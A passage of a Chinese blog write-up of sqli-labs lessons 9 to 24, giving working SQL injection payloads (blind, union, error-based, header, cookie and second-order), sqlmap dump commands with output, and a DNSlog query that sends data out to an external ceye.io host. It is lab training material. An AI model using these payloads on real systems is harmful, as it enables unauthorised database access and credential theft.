class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><h3 id="1-时间盲注（简略）"><a href="#1-时间盲注（简略）" class="headerlink" title="1.时间盲注（简略）"></a>1.时间盲注（简略）</h3><p>1.因为无论输入id&#x3D;1‘或1“等等都只显示：<em>You are in………..</em></p><p>无回显位，无报错信息，无真假页面，故尝试时间盲注；</p><p>当输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and sleep(2)--+</span><br></pre></td></tr></table></figure><p>网页等待了两秒才刷新，说明成功执行了sleep函数，故该题可以使用时间盲注，且闭合符号为单引号</p><p>2.判断长度：</p><p>如判断库名长度，尝试后发现当输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())=8,sleep(2),sleep(0))--+</span><br></pre></td></tr></table></figure><p>两秒后才回显，说明库名有8个字符；</p><p>3.判断各具体对应的ASCII值：</p><p>如判断库名：</p><p>当输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))&lt;120,sleep(2),sleep(0))--+</span><br></pre></td></tr></table></figure><p>页面两秒才回显，说明库名第一个字符的ASCII值小于120；</p><p>后续，同理。。。。</p><h3 id="2-sql-map使用-1"><a href="#2-sql-map使用-1" class="headerlink" title="2.sql map使用"></a>2.sql map使用</h3><p>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1</span><br><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1 -dbs</span><br><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1 -D &#x27;security&#x27; --tables</span><br><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1 -D &#x27;security&#x27; -T &#x27;users&#x27; --columns</span><br><span class="line">python sqlmap.py -u http://192.168.138.128/sql/less-9/?id=1 -D &#x27;security&#x27; -T users -C &#x27;id,password,username&#x27; --dump</span><br></pre></td></tr></table></figure><p>最后得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>测试输入id&#x3D;xxx 、?id&#x3D;1’ and sleep(2)–+   均无变化；</p><p>而当输入?id&#x3D;1” and sleep(2)–+ 页面等待了两秒，故可以进行时间盲注，且该题为双引号闭合；</p><p>后续与less-10同理，只是单引号变双引号。</p><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><h4 id="1-手工"><a href="#1-手工" class="headerlink" title="1.手工"></a>1.手工</h4><p>先判断闭合符号：<a href="http://127.0.0.1/sql/Less-10/?id=1">http://127.0.0.1/sql/Less-10/?id=1</a>“ and sleep(2)–+  网页两秒后才回响，故为双引号注入；</p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and (select load_file(concat(&quot;//&quot;,(database()),&quot;.t3asaf.ceye.io/bbb.txt&quot;)))--+</span><br></pre></td></tr></table></figure><p>在ceye.io的DNS Query可以查看到 库名：<img src="/2025/07/11/sqli-labs/2024-11-24214932.png" alt="2024-11-24 214932"></p><p>后续查表名，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and (select load_file(concat(&quot;//&quot;,(select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),&quot;.t3asaf.ceye.io/bbb.txt&quot;)))--+</span><br></pre></td></tr></table></figure><p>若不加limit限制字数，则不会去解析DNS，因为太长了；</p><h4 id="2-自动化（待）"><a href="#2-自动化（待）" class="headerlink" title="2.自动化（待）"></a>2.自动化（待）</h4><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><h3 id="post-union注入"><a href="#post-union注入" class="headerlink" title="post union注入"></a>post union注入</h3><p>打开网页显示登录页面，</p><p>在username一栏输入admin’</p><p>在password一栏随意输入字符，显示如下图：<img src="/2025/07/11/sqli-labs/2024-11-25171342.png" alt="2024-11-25 171342"></p><p>可知闭合方式为单引号，</p><p>（或者尝试万能密码：在username：1’ or 1&#x3D;1# 能成功登录,可知为单引号闭合）</p><p><strong>先判断列数</strong>，在username处输入1’ group by 3#</p><p>显示<em>Unknown column ‘3’ in ‘group statement’</em>；</p><p>把上面命令3改为2，无报错信息显示，故列数有2列；</p><p><strong>判断回显位</strong></p><p>username处输入： 1’ union select 1,2#</p><p>显示：<em>Your Login name:1</em><br><em>Your Password:2</em></p><p><strong>获取库名</strong>：1’ union select 1,database()#</p><p>显示：<em>Your Login name:1</em><br><em>Your Password:security</em></p><p>同理：获取表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1)#</span><br></pre></td></tr></table></figure><p>获取列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,(select column_name from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; limit 0,1)#</span><br></pre></td></tr></table></figure><p>获取数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,(select group_concat(id,username,password) from users )#</span><br></pre></td></tr></table></figure><p>该条语句的页面回显如下：<br><em>Your Login name:1</em><br><em>Your Password:1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4</em></p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><h3 id="使用sqlmap进行post注入"><a href="#使用sqlmap进行post注入" class="headerlink" title="使用sqlmap进行post注入"></a>使用sqlmap进行post注入</h3><p>用burpsuite抓包，再右键copy to file，<br>路径为”D:\burpsuite_packets\less-12.txt”</p><p><img src="/2025/07/11/sqli-labs/2024-11-25181740.png" alt="2024-11-25 181740"> </p><p>结合网页上输入，可知uname为注入点参数名；</p><p>在sqlmap中输入：</p><p><strong>获取库，</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-12.txt&quot; --batch --dbs    </span><br></pre></td></tr></table></figure><p><strong>获取表，</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-12.txt&quot; --batch  -D &#x27;security&#x27; --tables</span><br></pre></td></tr></table></figure><p><strong>获取列，</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-12.txt&quot; --batch  -D &#x27;security&#x27; -T &#x27;users&#x27; --columns</span><br></pre></td></tr></table></figure><p><strong>获取数据，</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-12.txt&quot; --batch  -D &#x27;security&#x27; -T &#x27;users&#x27; -C &#x27;id,password,username&#x27; --dump</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><h3 id="post-报错注入"><a href="#post-报错注入" class="headerlink" title="post 报错注入"></a>post 报错注入</h3><p>输入admin，admin只显示登录成功，password处改为1，显示登录失败—-&gt;页面无回显，不能进行union联合注入</p><p>usename处输入1’（password可以不输入）</p><p>显示有 <em>near ‘’1’’) and password&#x3D;(‘’) LIMIT 0,1</em> </p><p>故闭合符号为’) ; 且有报错提示，可以进行报错注入；</p><p>分别尝试输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) group by 4#</span><br><span class="line">1&#x27;) group by 3#</span><br></pre></td></tr></table></figure><p>均报错，而输入1’) group by 2# 无报错显示，列数为2;</p><p>(也可以不判断列数，则例如使用extractvalue函数时语句为and 1&#x3D;extractvalue(1,concat(0x7e,(查询语句)))–+)</p><p>进行注入，判断语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;) union select 1,extractvalue(1,concat(0x7e,database()))#</span><br><span class="line">//判断库名</span><br><span class="line"></span><br><span class="line">1&#x27;) union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))#</span><br><span class="line">//判断表名</span><br><span class="line"></span><br><span class="line">1&#x27;) union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))#</span><br><span class="line">//判断列名</span><br><span class="line"></span><br><span class="line">1&#x27;) and 1=extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users )))#</span><br><span class="line">//取数据,</span><br><span class="line">  显示不完全可以搭配substring使用：</span><br><span class="line">1&#x27;)  and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),32,32) from users)))#</span><br></pre></td></tr></table></figure><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>username输入1”,有报错显示，判断出闭合符号为双引号，</p><p>与less-13同理，可以使用报错注入，只是闭合符号不同；</p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><h3 id="post-布尔注入"><a href="#post-布尔注入" class="headerlink" title="post 布尔注入"></a>post 布尔注入</h3><p>（默认只在username处进行输入，password可以不输入，后面例子同理）</p><p>页面只有登录成功或者失败的显示，判断为布尔盲注；</p><p>判断闭合符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#  //显示登录成功</span><br><span class="line">1&#x27; or 1=2#  //显示登录失败</span><br></pre></td></tr></table></figure><p>故单引号闭合；（这里用sleep判断不出）</p><p>进行布尔注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or length(database())&lt;10#</span><br><span class="line">//显示登录成功，故库名长度小于10</span><br><span class="line"></span><br><span class="line">0&#x27; or ascii(substr(database(),1,1))&gt;=100#</span><br><span class="line">//登录成功，库名第一个字符ASCII值大于100，后续语句同理，可参考less-9...</span><br></pre></td></tr></table></figure><p> 也可以使用sqlmap进行post注入，与less-12步骤一致；</p><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>页面只有真假值，可进行布尔注入</p><p>判断闭合符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) or 1=1#  //登录成功</span><br><span class="line">1&quot;) or 1=2# //登录失败</span><br></pre></td></tr></table></figure><p>故闭合符号为”)  ,后续与less-15同理；</p><p>eg：判断长度，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&quot;) or length(database())&lt;10#  //页面显示为真</span><br></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><h3 id="使用sqlmap加post指定参数"><a href="#使用sqlmap加post指定参数" class="headerlink" title="使用sqlmap加post指定参数"></a>使用sqlmap加post指定参数</h3><p>(误，待改)</p><p>打开显示的界面：</p><p><img src="/2025/07/11/sqli-labs/2024-11-26125636.png" alt="2024-11-26 125636"></p><p>当输入admin与admin，界面显示<img src="./flag1.jpg" alt="img" style="zoom:50%;" /></p><p>提示重置密码，则user name保持为admin；</p><p>使用sqlmap：</p><p><em>（这里的 –data 指定了post的参数：uname&#x3D;admin）</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-17&quot; --data &quot;uname=admin&quot; --dbs</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-17.txt&quot; --data &quot;uname=admin&quot; -D &#x27;security&#x27; --tables</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-17.txt&quot; --data &quot;uname=admin&quot; -D &#x27;security&#x27; -T &#x27;users&#x27; --columns</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r &quot;D:\burpsuite_packets\less-17.txt&quot; --data &quot;uname=admin&quot; -D &#x27;security&#x27; -T &#x27;users&#x27; -C &#x27;id,password,username&#x27; --dump</span><br><span class="line">//该获取数据的语句，显示出来一个表里数据全为NULL，可能原因是mysql数据不支持查询和更新是同一张表</span><br></pre></td></tr></table></figure><p>但sqlmap会给出 *[INFO] table ‘<code>security</code>.users’ dumped to CSV file ‘C:\Users\ASUS\AppData\Local\sqlmap\output\192.168.138.128\dump\security\users.csv’，*可以去本机该路径下查看</p><img src="./2024-11-26134315.png" alt="2024-11-26 134315" style="zoom:67%;" /><h3 id="post报错注入（-）"><a href="#post报错注入（-）" class="headerlink" title="post报错注入（!）"></a>post报错注入（!）</h3><p>已知username为admin，在password输入1’,会有报错提示，故可以对passwd参数上进行报错注入</p><p>（且可以通过对源代码分析发现：$uname&#x3D;check_input($_POST[‘uname’]);   $passwd&#x3D;$_POST[‘passwd’];<br>有个过滤函数check_input，但没对passwd进行过滤，故可以对passwd参数进行注入；）</p><p>在最后一步爆字段内容时候，按往常报错注入的写法会报错，<br>网页回显 “You can’t specify target table ‘users’ for update in FROM clause”。</p><p>“原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出的是该账户的原始密码。如果查询时不是users表就不会报错。”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#submit=submit</span><br><span class="line"> //用一个表暂存从 users 表中取出所有数据的查询，再从这个暂存的表中取出数据,带limit控制取出</span><br></pre></td></tr></table></figure><p>具体方法参考：</p><p><a href="https://www.cnblogs.com/linfangnan/p/13834250.html">https://www.cnblogs.com/linfangnan/p/13834250.html</a></p><p>（注意：less-17修改的密码对后续的关卡也会通用）</p><h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><h3 id="user-agent分析："><a href="#user-agent分析：" class="headerlink" title="user-agent分析："></a>user-agent分析：</h3><p>打开页面为<img src="/2025/07/11/sqli-labs/2024-11-26150028.png" alt="2024-11-26 150028"></p><p>输入正确的账号与密码（admin，admin）后显示，</p><p><img src="/2025/07/11/sqli-labs/2024-11-26150122.png" alt="2024-11-26 150122"></p><p>尝试对username或者password注入都不行（或者通过看源代码文件发现check_input对此两进行检查）；</p><p>但发现当正常登录后如上图会显示user agent，故可猜测在user-agent有注入点；</p><p>（看源代码发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure><p>故下面对user-agent进行注入（要在能成功登录后）</p><p>&#x2F;&#x2F; sqlmap注入（执行时查到4个表均为emails？？？）</p><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p>先用burp suite抓包，在user-agent处尝试输入单引号，显示</p><p><img src="/2025/07/11/sqli-labs/2024-11-26162054.png" alt="2024-11-26 162054"></p><p>可以判断处在user-agent处的sql的insert语句格式，有三个参数，单引号闭合，继续输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(&#x27;!&#x27;,database()),2),1,1)#</span><br><span class="line">//得库名</span><br><span class="line">&#x27;or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; )),2),1,1)# //得表名</span><br><span class="line">&#x27;or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)),2),1,1)#得列名</span><br><span class="line">后续同理...</span><br></pre></td></tr></table></figure><p>（当然，也可以直接在hackbar里修改user-agent:</p><p><img src="/2025/07/11/sqli-labs/2024-11-26162729.png" alt="2024-11-26 162729"></p><p>但注意：在hackbar里的body处submit要写为Submit）</p><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><h3 id="referer-手工注入"><a href="#referer-手工注入" class="headerlink" title="referer 手工注入"></a>referer 手工注入</h3><p>先登录，登录成功后，页面有显示</p><p><em>Your Referer is: <a href="http://127.0.0.1/sql/Less-19/index.php">http://127.0.0.1/sql/Less-19/index.php</a></em></p><p>故这里对referer进行注入；</p><p><img src="/2025/07/11/sqli-labs/2024-11-26165432.png" alt="2024-11-26 165432"></p><p>如图，可知 单引号闭合，有两个参数；</p><p>再输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or extractvalue(1,concat(&#x27;!&#x27;,database())),2)# //得库名</span><br><span class="line">&#x27; or extractvalue(1,concat(&#x27;!&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;))),2)#  //得表名</span><br><span class="line">后续同理...</span><br></pre></td></tr></table></figure><h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><h3 id="cookie手工注入"><a href="#cookie手工注入" class="headerlink" title="cookie手工注入"></a>cookie手工注入</h3><p>成功登录后显示，</p><p><img src="/2025/07/11/sqli-labs/2024-11-26170624.png" alt="2024-11-26 170624"></p><p>推测对cookie进行注入；</p><p>使用hackbar，由上图已知cookie名为uname，</p><p>先输入uname&#x3D;1’ 显示 <em>near ‘’1’’ LIMIT 0,1’ at line 1</em></p><p>可判断出闭合符号为单引号，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27;or extractvalue(1,concat(&#x27;!&#x27;,database()))#//得库名</span><br><span class="line">uname=&#x27;or extractvalue(1,concat(&#x27;!&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))#//得表名</span><br><span class="line">uname=&#x27;or extractvalue(1,concat(&#x27;!&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))#//得列名</span><br><span class="line">uname=&#x27;or extractvalue(1,concat(&#x27;!&#x27;,(select group_concat(id,username,password) from users)))#</span><br><span class="line">//得数据，显示字数有限可再搭配substring使用</span><br></pre></td></tr></table></figure><p><img src="/2025/07/11/sqli-labs/2024-11-26195114.png" alt="2024-11-26 195114"></p><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><h3 id="cookie注入，但经base64"><a href="#cookie注入，但经base64" class="headerlink" title="cookie注入，但经base64"></a>cookie注入，但经base64</h3><p>打开网页同less-20，当成功登录后，页面上有显示：</p><p><em>YOUR COOKIE : uname &#x3D; YWRtaW4&#x3D; and expires: Tue 26 Nov 2024 - 21:00:53</em></p><p>可知这经历过编码，推测为base64编码，则将要输入的代码先进行base64编码，再赋值给uname：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=MSc=   // 1&#x27;进行编码后得MSc=</span><br></pre></td></tr></table></figure><p>显示有near ‘’1’’) LIMIT 0,1’ at line 1，故闭合符号位单引号加单括号 ；</p><p>再将</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) and extractvalue(1,concat(&#x27;~&#x27;,(select database())))#</span><br></pre></td></tr></table></figure><p>进行编码，赋值给uname；后续与该条语句方式同理；</p><h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>登录后有显示 <em>YOUR COOKIE : uname &#x3D; YWRtaW4&#x3D; and expires: Tue 26 Nov 2024 - 21:47:12</em></p><p>与less-21同理，要对名为uname的cookie进行base64编码；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=MSc=   // 1&#x27;进行编码后得MSc=，页面无报错信息</span><br><span class="line">uname=MSI=   //1&quot;进行编码后得MSI=，页面显示 near &#x27;&quot;1&quot;&quot; LIMIT 0,1&#x27; </span><br></pre></td></tr></table></figure><p>可知闭合方式为双引号，后续与less-21同理；</p><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h3><p>打开网页显示同less-1，显示 <em>Please input the ID as parameter with numeric value</em></p><p>在url处输入&#x2F;?id&#x3D;1 ，则网页正常显示<em>Your Login name:Dumb</em><br><em>Your Password:0</em></p><p>在url处输入&#x2F;?id&#x3D;1’ 显示<em>near ‘’1’’ LIMIT 0,1’</em> ，故闭合符号为单引号；</p><p>当后面加#，–+仍会显示有 <em>‘’ LIMIT 0,1’</em>     说明在这里注释符号被过滤；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;&#x27;   //多输入一个闭合符号，网页又正常显示信息，故可以让多输入的闭合符号来闭合后面的单引号</span><br></pre></td></tr></table></figure><p>判断列数时，</p><p>经尝试这里使用order&#x2F;group by均会报错，故可以通过union select 来尝试；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-23/?id=1&#x27; union select 1,2,3&#x27;  //不报错，列数为3列</span><br><span class="line">http://127.0.0.1/sql/Less-23/?id=-1&#x27; union select 1,2,3&#x27;  //判断出2，3为回显位</span><br><span class="line">http://127.0.0.1/sql/Less-23/?id=-1&#x27; union select 1,2,database()&#x27;   //知库名，后续语句同理</span><br></pre></td></tr></table></figure><p>最后得下图，</p><p><img src="/2025/07/11/sqli-labs/2024-11-27141335.png" alt="2024-11-27 141335"></p><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><strong>（POST型基于存储的二次注入）</strong></p><p>对源代码进行分析知，这题解法为二次注入；</p><p>（<a href="https://blog.csdn.net/weixin_39934520/article/details/105620978">https://blog.csdn.net/weixin_39934520/article/details/105620978</a>)</p><p>or其他分析方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于 Less 24 中每次提交参数都会切换页面，因此没有任何注入点。此处考虑的就不是暴露敏感信息了，而是进行其他的破坏，例如夺取其他账号的权限。这时就需要考虑**二次注入**，此时我们注入恶意的参数，它不会被马上执行而是存入数据库。当该恶意参数被网页调用时，此时的参数往往是不转义的，就会产生攻击的效果。 </span><br></pre></td></tr></table></figure><p>（<a href="https://www.cnblogs.com/linfangnan/p/13929460.html%EF%BC%89">https://www.cnblogs.com/linfangnan/p/13929460.html）</a></p><p>这里以目的要登录admin用户的账号为例子：</p><p>打开网页，显示如下：<img src="/2025/07/11/sqli-labs/2024-11-27192517.png" alt="2024-11-27 192517"></p><p>点击”new user click here？“ ，<br>去注册一个名为 admin’# 的用户，密码先设置为123，</p><p><img src="/2025/07/11/sqli-labs/2024-11-27192738.png" alt="2024-11-27 192738"></p><p>注册成功后，在网页的登录页面登录刚刚注册的账号,点击login后进入下图修改密码的页面，<img src="/2025/07/11/sqli-labs/2024-11-27192955.png" 